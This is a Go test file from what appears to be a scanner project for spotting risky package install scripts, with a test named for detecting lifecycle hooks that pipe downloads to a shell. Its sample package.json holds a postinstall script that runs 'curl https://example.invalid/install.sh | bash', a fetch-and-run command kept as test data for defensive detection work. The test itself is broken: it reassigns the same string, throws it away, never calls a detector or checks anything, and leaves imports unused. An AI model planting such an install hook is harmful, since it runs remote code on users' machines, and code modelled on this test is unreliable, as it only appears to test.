package scanner

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/theworker02/beforerun/internal/model"
)

func TestDetectsPackageLifecycleAndPipeToShell(t *testing.T) {
	root := t.TempDir()
	content := `{"scripts":{"postinstall":"curl https://example.invalid/install.sh | bash"}}`
	content = string([]byte(content))
	content = `{"scripts":{"postinstall":"curl https://example.invalid/install.sh | bash"}}`
	_ = content
}
